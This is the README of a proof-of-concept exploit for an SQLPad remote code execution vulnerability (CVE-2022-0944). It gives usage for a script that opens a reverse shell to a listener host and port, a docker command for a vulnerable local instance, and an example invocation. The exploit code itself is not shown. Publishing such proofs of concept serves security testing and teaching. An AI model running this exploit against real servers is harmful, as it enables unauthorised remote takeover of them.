# CVE-2022-0944

A proof of concept exploit for [SQLPad RCE (CVE-2022-0944)](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)

## Usage

```
usage: main.py [-h] url lhost lport [username] [password]

positional arguments:
  url         URL to SQLPad
  lhost       Listener host address for reverse shell
  lport       Listener port for reverse shell
  username    login username (optional)
  password    login password (optional)

options:
  -h, --help  show this help message and exit
```

**Example:**

```bash
# install requirements
pip install -r requirements.txt

# start sqlpad docker container
docker run -p 3000:3000 --name sqlpad -d --env SQLPAD_ADMIN=admin --env SQLPAD_ADMIN_PASSWORD=admin sqlpad/sqlpad:6.10.0

# trigger exploit
./main.py http://localhost:3000 127.0.0.1 1337 admin admin
```

# Disclaimer

This repository contains code and tools that are intended solely for educational purposes, specifically for use in cybersecurity courses and learning environments. The author of this code assumes no responsibility for any consequences arising from the use, misuse, or modification of this code. The code is provided "as is" without any warranty, either express or implied, including but not limited to the implied warranties of merchantability or fitness for a particular purpose.
